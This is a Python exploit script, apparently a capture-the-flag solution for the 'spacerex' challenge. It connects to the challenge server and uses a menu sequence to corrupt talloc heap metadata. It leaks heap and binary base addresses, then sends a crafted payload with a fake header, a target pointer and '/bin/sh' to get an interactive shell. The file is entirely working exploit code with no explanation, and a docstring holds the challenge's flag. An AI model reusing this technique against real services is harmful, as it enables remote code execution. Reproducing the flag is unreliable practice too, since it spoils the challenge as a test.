from pwnlib import *

"""
BKP{Playing with and corrupting talloc internals}
"""

LOCAL = False
BIN_LIBC_DIST = 0x7f6000

# clears the screen
def c():
	return s.recv_until("> __")

# set up some random star
def init_star():
	s.send("1\nmystar\n0\n3500\n")
	s.send("1\n") # num planets
	s.send("myplanet\nhax\n")
	s.send("123123\n"*3)
	s.send("3677\n1\n")
	s.send("5\n"*6 + "70\n0\n")
	s.send("M\n") # moons
	s.send("4\n") # this many
	s.send("123123\nmoon1\n")
	s.send("123123\nmoon2\n")
	s.send("123123\nmoon3\n")
	s.send("123123\nmoon4\n")
	c()

# enter probe mode
def probe(ss):
	s.send("6\n%s\n" % ss)
	c()

# edit a moon to zero its index
def edit_moon(pn, moon):
	print "editing", pn, moon
	s.send("4\n%s\n" % pn)
	s.send(moon + "\n")
	s.send("1337\n")
	s.send(moon + "\n")
	c()

def destroy_moon(pn, moon):
	s.send("8\n%s\n" % pn)
	s.send(moon + "\n")
	c()

def leak():	
	s.send("5\n")
	s.send("-1\n")
	s.recv_until("(y/n)? _")
	s.send("y\n")
	s.recv_until("-------\n")
	result = s.recv_until("\n1) Edit planet")
	print c()
	result = [r for r in result.split("\n") if r != ""]
	result = [r[r.find(".")+1:] for r in result]
	result = [r.replace("%", ",") for r in result]
	result = [r.replace(" ", "") for r in result]
	result = [r.split(",")[:-1] for r in result]

	leaked = []
	for r in result:
		n = 0
		for ch in r[::-1]:
			i = int(ch)
			n <<= 8
			n |= i

		leaked += [n]

	return leaked

def add_planet(pn, no_moons=False):
	s.send("6\n")
	s.send("%s\nhax\n" % pn)
	s.send("123123\n"*3)
	s.send("3677\n1\n")
	s.send("5\n"*6 + "70\n0\n")
	if no_moons:
		s.send("F\n")
	else:
		s.send("M\n") # moons
		s.send("4\n") # this many
		s.send("123123\nmoon1\n")
		s.send("123123\nmoon2\n")
		s.send("123123\nmoon3\n")
		s.send("123123\nmoon4\n")
	c()




if LOCAL:
	s = Socket(("localhost", 4442))
else:
	s = Socket(("spacerex.bostonkey.party", 6666))
c()


# set it all up

init_star()
probe("mystar")
edit_moon("myplanet", "moon2")
destroy_moon("myplanet", "moon2")


# leak

leaked = leak()
heap_base = leaked[10] - 0x4d40
bin_base = leaked[16] - 0x40f3

print "heap: 0x%x" % heap_base
print "bin:  0x%x" % bin_base

assert heap_base & 0xfff == 0
assert bin_base & 0xfff == 0

libc_base = bin_base - BIN_LIBC_DIST 



###

add_planet("planet2")


edit_moon("myplanet", "moon3")
destroy_moon("myplanet", "moon3")
edit_moon("myplanet", "moon4")
destroy_moon("myplanet", "moon4")

for i in range(2, 4+1):
	edit_moon("planet2", "moon%d" % i)
	destroy_moon("planet2", "moon%d" % i)


add_planet("planet3")


target = bin_base + 0x3c78 #libc_base + 0x46640

payload = "\x00"*48
payload += pq(target)
payload += pq(0)*2
payload += pd(0xe8150c70) # MAGIC
payload += pd(0)
payload += pattern(0x68 - len(payload))
payload += "/bin/sh\x00"

assert "\n" not in payload
assert len(payload) < 0x80


# modify a moon
s.send("4\n")
s.send("planet2\n")
s.send("\x01\x01\n") # moon name .. weird
s.send("123\n") # mass
s.send(payload + "\n")
c()

s.send("8\n")
s.send("planet3\n")
s.send("\n")


s.interact()
